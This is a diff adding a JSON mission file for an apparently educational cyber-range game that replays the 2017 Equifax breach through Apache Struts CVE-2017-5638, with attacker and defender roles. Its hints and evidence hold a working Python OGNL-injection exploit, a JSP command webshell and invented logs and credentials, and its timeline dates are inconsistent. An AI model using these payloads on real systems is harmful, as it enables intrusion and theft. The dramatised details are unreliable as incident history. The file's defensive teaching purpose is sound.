@@ -1,0 +1,602 @@
+{
+  "id": "equifax-2017",
+  "title": "The Equifax Catastrophe",
+  "subtitle": "CVE-2017-5638: The $1.4 Billion Patch That Never Happened",
+  "description": "Relive one of the largest data breaches in history. In March 2017, Apache released a critical security patch for a remote code execution vulnerability in Struts 2. Equifax was notified. The patch was never applied. By May, attackers had infiltrated the network. For 76 days, they roamed freely, exfiltrating the personal data of 147 million Americans. You have the power to change history—or repeat it.",
+  "difficulty": "intermediate",
+  "estimatedDuration": 35,
+
+  "realIncident": {
+    "date": "2017-09-07",
+    "organization": "Equifax",
+    "impact": "147 million people affected, $1.4 billion in costs, CEO resignation, 4 Chinese military hackers indicted",
+    "cve": "CVE-2017-5638",
+    "attribution": "Chinese People's Liberation Army (PLA) 54th Research Institute"
+  },
+
+  "availableRoles": ["attacker", "defender"],
+
+  "timeline": [
+    {
+      "id": "phase-1-discovery",
+      "date": "2017-03-06T00:00:00Z",
+      "displayDate": "March 6, 2017",
+      "title": "Vulnerability Discovered",
+      "description": "Security researcher Nike Zheng discovers CVE-2017-5638 in Apache Struts 2. The vulnerability allows remote code execution through a crafted Content-Type header.",
+      "type": "discovery",
+      "importance": "critical",
+      "actors": ["Nike Zheng", "Apache Foundation"]
+    },
+    {
+      "id": "phase-2-patch",
+      "date": "2017-03-07T00:00:00Z",
+      "displayDate": "March 7, 2017",
+      "title": "Patch Released",
+      "description": "Apache Software Foundation releases security bulletin and patches for Struts 2.3.32 and 2.5.10.1. The fix is publicly available.",
+      "type": "notification",
+      "importance": "critical",
+      "actors": ["Apache Software Foundation"]
+    },
+    {
+      "id": "phase-3-notification",
+      "date": "2017-03-08T00:00:00Z",
+      "displayDate": "March 8, 2017",
+      "title": "DHS Notification",
+      "description": "US-CERT issues alert. Department of Homeland Security contacts Equifax, Experian, and TransUnion to warn about CVE-2017-5638.",
+      "type": "notification",
+      "importance": "high",
+      "actors": ["DHS", "US-CERT", "Equifax"]
+    },
+    {
+      "id": "phase-4-internal-email",
+      "date": "2017-03-09T00:00:00Z",
+      "displayDate": "March 9, 2017",
+      "title": "Internal Email",
+      "description": "Equifax IT security sends internal email directing administrators to apply the Apache Struts patch. The email is not acted upon for the dispute portal.",
+      "type": "notification",
+      "importance": "critical",
+      "actors": ["Equifax IT Security"]
+    },
+    {
+      "id": "phase-5-initial-breach",
+      "date": "2017-03-10T00:00:00Z",
+      "displayDate": "March 10, 2017",
+      "title": "Initial Breach",
+      "description": "Attackers exploit CVE-2017-5638 on Equifax's ACIS dispute portal. They gain initial foothold through a webshell upload.",
+      "type": "exploitation",
+      "importance": "critical",
+      "actors": ["PLA Unit 54th", "Attackers"]
+    },
+    {
+      "id": "phase-6-failed-scan",
+      "date": "2017-03-15T00:00:00Z",
+      "displayDate": "March 15, 2017",
+      "title": "Vulnerability Scan Fails",
+      "description": "Equifax runs automated vulnerability scans to detect Apache Struts issues. The scans fail to identify the vulnerable dispute portal due to misconfiguration.",
+      "type": "response",
+      "importance": "high",
+      "actors": ["Equifax Security Team"]
+    },
+    {
+      "id": "phase-7-lateral-movement",
+      "date": "2017-05-13T00:00:00Z",
+      "displayDate": "May 13, 2017",
+      "title": "Data Exfiltration Begins",
+      "description": "After two months of reconnaissance, attackers pivot to internal databases. They begin extracting personal information: names, SSNs, birth dates, addresses, driver's licenses.",
+      "type": "breach",
+      "importance": "critical",
+      "actors": ["Attackers"]
+    },
+    {
+      "id": "phase-8-detection",
+      "date": "2017-07-29T00:00:00Z",
+      "displayDate": "July 29, 2017",
+      "title": "Suspicious Traffic Detected",
+      "description": "After 76 days of undetected access, Equifax security team observes anomalous network traffic from the dispute portal. The Apache patch is finally applied.",
+      "type": "detection",
+      "importance": "critical",
+      "actors": ["Equifax SOC"]
+    },
+    {
+      "id": "phase-9-shutdown",
+      "date": "2017-07-30T00:00:00Z",
+      "displayDate": "July 30, 2017",
+      "title": "Portal Shutdown",
+      "description": "The ACIS web application is taken offline. Forensic investigation begins. Mandiant is hired to assess the damage.",
+      "type": "response",
+      "importance": "high",
+      "actors": ["Equifax", "Mandiant"]
+    },
+    {
+      "id": "phase-10-disclosure",
+      "date": "2017-09-07T00:00:00Z",
+      "displayDate": "September 7, 2017",
+      "title": "Public Disclosure",
+      "description": "Equifax announces the breach to the public. 147 million Americans affected. CEO Richard Smith resigns. Congressional hearings follow.",
+      "type": "disclosure",
+      "importance": "critical",
+      "actors": ["Equifax", "Richard Smith", "US Congress"]
+    }
+  ],
+
+  "objectives": [
+    {
+      "id": "obj-recon-struts",
+      "phaseId": "phase-1-discovery",
+      "title": "Research CVE-2017-5638",
+      "description": "As an attacker, study the newly disclosed Apache Struts vulnerability. Understand how OGNL injection works in the Content-Type header.",
+      "role": "attacker",
+      "type": "reconnaissance",
+      "validation": {
+        "type": "quiz",
+        "payload": "Content-Type"
+      },
+      "points": 50,
+      "mitreTechniques": ["T1592"],
+      "unlocksEvidence": ["evidence-cve-advisory", "evidence-exploit-poc"],
+      "hints": [
+        {
+          "cost": 10,
+          "text": "Look at the Apache security bulletin. What HTTP header is vulnerable?"
+        },
+        {
+          "cost": 20,
+          "text": "The vulnerability is in the Jakarta Multipart parser. It processes the Content-Type header."
+        }
+      ]
+    },
+    {
+      "id": "obj-identify-target",
+      "phaseId": "phase-5-initial-breach",
+      "title": "Identify Vulnerable Endpoint",
+      "description": "Scan Equifax's public-facing web applications to find services running Apache Struts 2.3.x. The ACIS dispute portal is your target.",
+      "role": "attacker",
+      "type": "reconnaissance",
+      "requiredObjectives": ["obj-recon-struts"],
+      "validation": {
+        "type": "manual"
+      },
+      "points": 75,
+      "mitreTechniques": ["T1590"],
+      "unlocksEvidence": ["evidence-acis-portal", "evidence-struts-version"],
+      "hints": [
+        {
+          "cost": 15,
+          "text": "Use tools like nmap or wappalyzer to fingerprint web technologies."
+        }
+      ]
+    },
+    {
+      "id": "obj-craft-payload",
+      "phaseId": "phase-5-initial-breach",
+      "title": "Craft OGNL Injection Payload",
+      "description": "Create a malicious Content-Type header containing an OGNL expression to execute system commands. Test with 'whoami' or 'id'.",
+      "role": "attacker",
+      "type": "exploitation",
+      "requiredObjectives": ["obj-identify-target"],
+      "requiredEvidence": ["evidence-exploit-poc"],
+      "validation": {
+        "type": "code_execution",
+        "endpoint": "/api/time-breach/equifax/exploit",
+        "expectedResponse": {
+          "exploited": true,
+          "output": "struts"
+        }
+      },
+      "points": 150,
+      "mitreTechniques": ["T1190"],
+      "unlocksEvidence": ["evidence-webshell"],
+      "hints": [
+        {
+          "cost": 25,
+          "text": "The OGNL expression format is: %{(#cmd='command')(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))(#p=new java.lang.ProcessBuilder(#cmds))...}"
+        },
+        {
+          "cost": 40,
+          "text": "Set Content-Type to: %{(#_='multipart/form-data').(#cmd='whoami')...} in your HTTP request"
+        }
+      ]
+    },
+    {
+      "id": "obj-upload-webshell",
+      "phaseId": "phase-5-initial-breach",
+      "title": "Establish Persistence",
+      "description": "Upload a webshell to maintain access. This will allow you to execute commands even if the Struts vulnerability is patched.",
+      "role": "attacker",
+      "type": "exploitation",
+      "requiredObjectives": ["obj-craft-payload"],
+      "validation": {
+        "type": "file_upload",
+        "endpoint": "/api/time-breach/equifax/upload-shell"
+      },
+      "points": 100,
+      "mitreTechniques": ["T1505"],
+      "unlocksEvidence": ["evidence-persistence"],
+      "hints": [
+        {
+          "cost": 20,
+          "text": "Use the RCE to write a JSP webshell to the web server's directory."
+        }
+      ]
+    },
+    {
+      "id": "obj-lateral-movement",
+      "phaseId": "phase-7-lateral-movement",
+      "title": "Pivot to Internal Network",
+      "description": "From the compromised web server, scan internal network segments. Discover the database servers containing consumer data.",
+      "role": "attacker",
+      "type": "exploitation",
+      "requiredObjectives": ["obj-upload-webshell"],
+      "validation": {
+        "type": "api_call",
+        "endpoint": "/api/time-breach/equifax/network-scan"
+      },
+      "points": 125,
+      "mitreTechniques": ["T1018"],
+      "unlocksEvidence": ["evidence-network-map", "evidence-db-server"],
+      "hints": [
+        {
+          "cost": 30,
+          "text": "The web server is in a DMZ. Look for internal IP ranges like 10.x.x.x"
+        }
+      ]
+    },
+    {
+      "id": "obj-extract-data",
+      "phaseId": "phase-7-lateral-movement",
+      "title": "Exfiltrate Consumer Records",
+      "description": "Query the unencrypted Oracle databases. Extract names, Social Security numbers, birth dates, addresses. Prepare data for exfiltration over encrypted channels.",
+      "role": "attacker",
+      "type": "exploitation",
+      "requiredObjectives": ["obj-lateral-movement"],
+      "requiredEvidence": ["evidence-db-server"],
+      "validation": {
+        "type": "api_call",
+        "endpoint": "/api/time-breach/equifax/exfiltrate"
+      },
+      "points": 200,
+      "mitreTechniques": ["T1005", "T1041"],
+      "hints": [
+        {
+          "cost": 35,
+          "text": "Use SQL queries to dump the consumer_data table. The data is not encrypted at rest."
+        }
+      ]
+    },
+    {
+      "id": "obj-defender-patch",
+      "phaseId": "phase-4-internal-email",
+      "title": "Apply Security Patch",
+      "description": "As a defender, you received the March 9 email. Identify all systems running Apache Struts and apply the patch before the breach occurs.",
+      "role": "defender",
+      "type": "defense",
+      "validation": {
+        "type": "api_call",
+        "endpoint": "/api/time-breach/equifax/defender/patch"
+      },
+      "points": 200,
+      "mitreTechniques": [],
+      "hints": [
+        {
+          "cost": 25,
+          "text": "Run 'find / -name struts*.jar' on all web servers to identify vulnerable versions."
+        },
+        {
+          "cost": 40,
+          "text": "The ACIS dispute portal is running Struts 2.3.28. Upgrade to 2.3.32 immediately."
+        }
+      ]
+    },
+    {
+      "id": "obj-defender-scan",
+      "phaseId": "phase-6-failed-scan",
+      "title": "Fix Vulnerability Scanner",
+      "description": "The March 15 scan failed to detect the vulnerability. Identify why and reconfigure the scanner to find the dispute portal.",
+      "role": "defender",
+      "type": "defense",
+      "validation": {
+        "type": "manual"
+      },
+      "points": 150,
+      "mitreTechniques": [],
+      "hints": [
+        {
+          "cost": 30,
+          "text": "The scanner is configured to only check internal IPs. The dispute portal has a public IP."
+        }
+      ]
+    },
+    {
+      "id": "obj-defender-detection",
+      "phaseId": "phase-8-detection",
+      "title": "Detect Anomalous Traffic",
+      "description": "Analyze network logs from May-July. Identify the data exfiltration patterns: large outbound transfers to Chinese IP addresses.",
+      "role": "defender",
+      "type": "investigation",
+      "requiredEvidence": ["evidence-network-logs"],
+      "validation": {
+        "type": "quiz",
+        "payload": "outbound_china"
+      },
+      "points": 175,
+      "mitreTechniques": [],
+      "hints": [
+        {
+          "cost": 20,
+          "text": "Look for unusual outbound HTTPS connections from database servers."
+        }
+      ]
+    }
+  ],
+
+  "evidence": [
+    {
+      "id": "evidence-cve-advisory",
+      "type": "document",
+      "title": "Apache Struts Security Bulletin S2-045",
+      "description": "Official security advisory from Apache Foundation describing CVE-2017-5638",
+      "content": "## Apache Struts 2 Security Advisory S2-045\n\n**Severity:** Critical\n**CVE:** CVE-2017-5638\n**Affected Versions:** Struts 2.3.5 - 2.3.31, Struts 2.5 - 2.5.10\n\n### Vulnerability Description\n\nA remote code execution vulnerability exists in the Jakarta Multipart parser when processing a malformed Content-Type HTTP header. An attacker can inject arbitrary OGNL expressions which are evaluated server-side, leading to code execution.\n\n### Exploitation\n\nAttacker sends a crafted Content-Type header:\n```\nContent-Type: %{(#cmd='id')(#iswin=...)...}\n```\n\n### Mitigation\n\nUpgrade immediately to:\n- Struts 2.3.32\n- Struts 2.5.10.1\n\nAlternatively, implement strict Content-Type validation at the WAF layer.\n\n**Released:** March 7, 2017",
+      "metadata": {
+        "author": "Apache Security Team",
+        "timestamp": "2017-03-07T14:00:00Z",
+        "source": "https://cwiki.apache.org/confluence/display/WW/S2-045"
+      }
+    },
+    {
+      "id": "evidence-exploit-poc",
+      "type": "code",
+      "title": "Public Exploit Proof-of-Concept",
+      "description": "Python script demonstrating CVE-2017-5638 exploitation",
+      "content": "```python\nimport requests\n\ndef exploit_struts(target_url):\n    payload = \"%{(#_='multipart/form-data').\"\n    payload += \"(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).\"\n    payload += \"(#_memberAccess?(#_memberAccess=#dm):\"\n    payload += \"((#container=#context['com.opensymphony.xwork2.ActionContext.container']).\"\n    payload += \"(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).\"\n    payload += \"(#ognlUtil.getExcludedPackageNames().clear()).\"\n    payload += \"(#ognlUtil.getExcludedClasses().clear()).\"\n    payload += \"(#context.setMemberAccess(#dm)))).\"\n    payload += \"(#cmd='id').\"\n    payload += \"(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).\"\n    payload += \"(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).\"\n    payload += \"(#p=new java.lang.ProcessBuilder(#cmds)).\"\n    payload += \"(#p.redirectErrorStream(true)).(#process=#p.start()).\"\n    payload += \"(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).\"\n    payload += \"(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).\"\n    payload += \"(#ros.flush())}\"\n    \n    headers = {\n        'Content-Type': payload,\n        'User-Agent': 'Mozilla/5.0'\n    }\n    \n    response = requests.post(target_url, headers=headers, data={'foo': 'bar'})\n    return response.text\n\nif __name__ == '__main__':\n    result = exploit_struts('http://target/upload.action')\n    print(result)\n```",
+      "metadata": {
+        "author": "Public",
+        "source": "GitHub"
+      }
+    },
+    {
+      "id": "evidence-acis-portal",
+      "type": "network",
+      "title": "ACIS Dispute Portal Discovery",
+      "description": "Scan results showing the vulnerable Equifax web application",
+      "content": "```\nNmap scan report for acis.equifax.com\nHost is up (0.024s latency)\n\nPORT     STATE SERVICE     VERSION\n80/tcp   open  http        Apache httpd 2.4.18\n443/tcp  open  ssl/http    Apache httpd 2.4.18\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Automated Consumer Interview System\n\nTechnology Detection:\n- Apache Struts 2.3.28 (VULNERABLE)\n- Java 1.7.0_51\n- Oracle WebLogic 10.3.6\n\n⚠️  CRITICAL: Apache Struts version is vulnerable to CVE-2017-5638\n```"
+    },
+    {
+      "id": "evidence-struts-version",
+      "type": "log",
+      "title": "Server Response Headers",
+      "description": "HTTP headers revealing Struts version",
+      "content": "```\nHTTP/1.1 200 OK\nDate: Thu, 09 Mar 2017 18:32:14 GMT\nServer: Apache/2.4.18 (Ubuntu)\nStruts-Version: 2.3.28\nX-Powered-By: Servlet/3.0 JSP/2.2 (WebLogic 10.3.6)\nContent-Type: text/html;charset=UTF-8\nContent-Length: 4523\n```"
+    },
+    {
+      "id": "evidence-webshell",
+      "type": "code",
+      "title": "JSP Webshell",
+      "description": "The backdoor uploaded to maintain persistence",
+      "content": "```jsp\n<%@ page import=\"java.io.*\" %>\n<%\n    String cmd = request.getParameter(\"cmd\");\n    if (cmd != null) {\n        Process p = Runtime.getRuntime().exec(cmd);\n        InputStream in = p.getInputStream();\n        BufferedReader reader = new BufferedReader(new InputStreamReader(in));\n        String line;\n        while ((line = reader.readLine()) != null) {\n            out.println(line + \"<br>\");\n        }\n    }\n%>\n```\n\nUploaded to: `/var/www/html/acis/assets/temp/shell.jsp`\nAccess URL: `https://acis.equifax.com/assets/temp/shell.jsp?cmd=whoami`"
+    },
+    {
+      "id": "evidence-persistence",
+      "type": "log",
+      "title": "Webshell Access Logs",
+      "description": "Apache logs showing webshell usage",
+      "content": "```\n220.181.108.83 - - [12/May/2017:03:14:22 +0000] \"GET /assets/temp/shell.jsp?cmd=whoami HTTP/1.1\" 200 512\n220.181.108.83 - - [12/May/2017:03:18:45 +0000] \"GET /assets/temp/shell.jsp?cmd=ifconfig HTTP/1.1\" 200 1893\n220.181.108.83 - - [12/May/2017:04:22:11 +0000] \"GET /assets/temp/shell.jsp?cmd=netstat+-an HTTP/1.1\" 200 8472\n```\n\nIP 220.181.108.83 geolocates to Beijing, China."
+    },
+    {
+      "id": "evidence-network-map",
+      "type": "network",
+      "title": "Internal Network Topology",
+      "description": "Network scan from compromised web server",
+      "content": "```\nInternal Network Discovery:\n\nDMZ Segment (172.16.1.0/24):\n172.16.1.10 - Web Server (compromised)\n172.16.1.11 - Load Balancer\n172.16.1.12 - Web Server 2\n\nDatabase Segment (10.10.50.0/24):\n10.10.50.20 - Oracle DB Primary (consumer_data)\n10.10.50.21 - Oracle DB Replica\n10.10.50.22 - MySQL (application_db)\n\nNo firewall rules between DMZ and DB segment! ⚠️\n```"
+    },
+    {
+      "id": "evidence-db-server",
+      "type": "database",
+      "title": "Database Server Credentials",
+      "description": "Hardcoded credentials found in web application config",
+      "content": "```xml\n<!-- /var/www/html/acis/WEB-INF/config/database.xml -->\n<database>\n  <connection>\n    <host>10.10.50.20</host>\n    <port>1521</port>\n    <database>CONSUMER_DB</database>\n    <username>acis_app</username>\n    <password>Equifax2017!</password>\n  </connection>\n  <schema>consumer_data</schema>\n</database>\n```\n\nThe application user has SELECT access to all consumer tables including:\n- ssn_records\n- personal_info\n- credit_history\n- driver_licenses"
+    },
+    {
+      "id": "evidence-network-logs",
+      "type": "log",
+      "title": "Network Traffic Logs (May-July 2017)",
+      "description": "Firewall logs showing suspicious outbound connections",
+      "content": "```\n[2017-05-13 08:23:15] ALLOW 10.10.50.20:443 -> 61.135.169.125:443 (SSL/TLS) - 1.2 GB transferred\n[2017-05-14 02:18:44] ALLOW 10.10.50.20:443 -> 61.135.169.125:443 (SSL/TLS) - 890 MB transferred\n[2017-05-15 03:44:22] ALLOW 10.10.50.20:443 -> 61.135.169.125:443 (SSL/TLS) - 1.8 GB transferred\n...\n[2017-07-28 23:15:09] ALLOW 10.10.50.20:443 -> 61.135.169.125:443 (SSL/TLS) - 2.1 GB transferred\n\nTotal exfiltration: ~420 GB over 76 days\nDestination IP: 61.135.169.125 (Beijing, China)\n```"
+    }
+  ],
+
+  "endings": [
+    {
+      "id": "ending-attacker-success",
+      "type": "success",
+      "title": "Mission Accomplished",
+      "description": "You successfully replicated the Equifax breach. 147 million records exfiltrated over 76 days.",
+      "condition": {
+        "type": "objectives_completed",
+        "value": ["obj-extract-data"]
+      },
+      "debriefing": {
+        "summary": "You exploited CVE-2017-5638, maintained persistence, laterally moved to database servers, and exfiltrated consumer data—exactly as the real attackers did.",
+        "realWorldComparison": "In reality, Chinese PLA Unit 54th executed this attack from May to July 2017. Four military hackers were indicted by the DOJ in 2020. The breach cost Equifax $1.4 billion in remediation and settlement costs.",
+        "lessonsLearned": [
+          "Patching critical vulnerabilities is not optional—it's survival",
+          "The patch was available 66 days before exploitation began",
+          "Network segmentation could have prevented database access",
+          "Encrypted data at rest would have limited impact",
+          "Monitoring outbound traffic can detect exfiltration"
+        ],
+        "metrics": {
+          "objectivesCompleted": 6,
+          "totalObjectives": 6,
+          "timeElapsed": 2100,
+          "detectionEvents": 0,
+          "mitreTechniquesUsed": ["T1592", "T1590", "T1190", "T1505", "T1018", "T1005", "T1041"]
+        }
+      },
+      "rewards": {
+        "points": 1000,
+        "achievements": ["APT Operator", "Database Raider", "Stealth Master"],
+        "badges": ["equifax-breacher"]
+      }
+    },
+    {
+      "id": "ending-attacker-detected",
+      "type": "detected",
+      "title": "Incident Detected",
+      "description": "Your attack was discovered before data exfiltration. Security team isolated the compromised systems.",
+      "condition": {
+        "type": "detection_threshold",
+        "value": 3
+      },
+      "debriefing": {
+        "summary": "Your exploitation was too noisy. Equifax SOC detected the webshell and blocked your access before you reached the databases.",
+        "realWorldComparison": "In reality, attackers remained undetected for 76 days. Equifax did not discover the breach until July 29, after 147 million records were stolen.",
+        "lessonsLearned": [
+          "Advanced attackers use slow, methodical approaches to avoid detection",
+          "Webshells should be hidden and use minimal beaconing",
+          "Blending in with legitimate traffic is key to persistence"
+        ],
+        "metrics": {
+          "objectivesCompleted": 3,
+          "totalObjectives": 6,
+          "timeElapsed": 900,
+          "detectionEvents": 3,
+          "mitreTechniquesUsed": ["T1592", "T1590", "T1190"]
+        }
+      },
+      "rewards": {
+        "points": 400,
+        "achievements": ["Script Kiddie"],
+        "badges": []
+      }
+    },
+    {
+      "id": "ending-defender-success",
+      "type": "prevented",
+      "title": "Breach Prevented",
+      "description": "You applied the patch on March 9. The attack never happened. 147 million people thank you.",
+      "condition": {
+        "type": "objectives_completed",
+        "value": ["obj-defender-patch"]
+      },
+      "debriefing": {
+        "summary": "By patching immediately after the March 9 email, you prevented the entire Equifax catastrophe. The attackers found no foothold.",
+        "realWorldComparison": "In reality, Equifax failed to patch the ACIS portal. The breach proceeded undetected for months. This single patch would have prevented the entire incident.",
+        "lessonsLearned": [
+          "One action, taken on time, can prevent billion-dollar disasters",
+          "Security bulletins marked CRITICAL should trigger emergency patching",
+          "Testing patches in production is better than no patch at all",
+          "Asset inventory is critical—you can't patch what you don't know exists"
+        ],
+        "metrics": {
+          "objectivesCompleted": 1,
+          "totalObjectives": 3,
+          "timeElapsed": 600,
+          "detectionEvents": 0,
+          "mitreTechniquesUsed": []
+        }
+      },
+      "rewards": {
+        "points": 1500,
+        "achievements": ["Hero of Security", "Patch Champion", "Incident Preventer"],
+        "badges": ["defender-elite"]
+      }
+    },
+    {
+      "id": "ending-defender-partial",
+      "type": "partial",
+      "title": "Limited Success",
+      "description": "You detected the breach early but damage was already done. Faster response could have saved millions of records.",
+      "condition": {
+        "type": "objectives_completed",
+        "value": ["obj-defender-detection"]
+      },
+      "debriefing": {
+        "summary": "You caught the exfiltration in network logs, but weeks of data had already been stolen. Earlier patching or better monitoring would have helped.",
+        "realWorldComparison": "This mirrors Equifax's actual detection timeline—they found the breach in late July, but it began in May.",
+        "lessonsLearned": [
+          "Detection without prevention still results in massive damage",
+          "Continuous monitoring should alert on first anomaly, not after gigabytes are transferred",
+          "Defense-in-depth: patching + segmentation + monitoring + encryption"
+        ],
+        "metrics": {
+          "objectivesCompleted": 2,
+          "totalObjectives": 3,
+          "timeElapsed": 1800,
+          "detectionEvents": 1,
+          "mitreTechniquesUsed": []
+        }
+      },
+      "rewards": {
+        "points": 750,
+        "achievements": ["SOC Analyst"],
+        "badges": []
+      }
+    }
+  ],
+
+  "mitreTechniques": [
+    {
+      "id": "T1592",
+      "name": "Gather Victim Host Information",
+      "tactic": "Reconnaissance",
+      "description": "Adversaries may gather information about victim systems to target.",
+      "url": "https://attack.mitre.org/techniques/T1592/"
+    },
+    {
+      "id": "T1590",
+      "name": "Gather Victim Network Information",
+      "tactic": "Reconnaissance",
+      "description": "Adversaries may gather information about the victim's networks.",
+      "url": "https://attack.mitre.org/techniques/T1590/"
+    },
+    {
+      "id": "T1190",
+      "name": "Exploit Public-Facing Application",
+      "tactic": "Initial Access",
+      "description": "Adversaries may attempt to exploit a weakness in an Internet-facing application.",
+      "url": "https://attack.mitre.org/techniques/T1190/"
+    },
+    {
+      "id": "T1505",
+      "name": "Server Software Component",
+      "tactic": "Persistence",
+      "description": "Adversaries may abuse legitimate software to establish persistence.",
+      "url": "https://attack.mitre.org/techniques/T1505/"
+    },
+    {
+      "id": "T1018",
+      "name": "Remote System Discovery",
+      "tactic": "Discovery",
+      "description": "Adversaries may attempt to get a listing of other systems.",
+      "url": "https://attack.mitre.org/techniques/T1018/"
+    },
+    {
+      "id": "T1005",
+      "name": "Data from Local System",
+      "tactic": "Collection",
+      "description": "Adversaries may search local system sources for data.",
+      "url": "https://attack.mitre.org/techniques/T1005/"
+    },
+    {
+      "id": "T1041",
+      "name": "Exfiltration Over C2 Channel",
+      "tactic": "Exfiltration",
+      "description": "Adversaries may steal data by exfiltrating over command and control channel.",
+      "url": "https://attack.mitre.org/techniques/T1041/"
+    }
+  ],
+
+  "media": {
+    "coverImage": "/missions/equifax/cover.jpg",
+    "networkDiagrams": [
+      "/missions/equifax/network-topology.png",
+      "/missions/equifax/attack-flow.png"
+    ]
+  },
+
+  "tags": ["web", "rce", "patching", "database", "data-breach", "apt", "real-world"],
+
+  "createdAt": "2025-12-02T00:00:00Z",
+  "updatedAt": "2025-12-02T00:00:00Z",
+  "version": "1.0.0"
+}
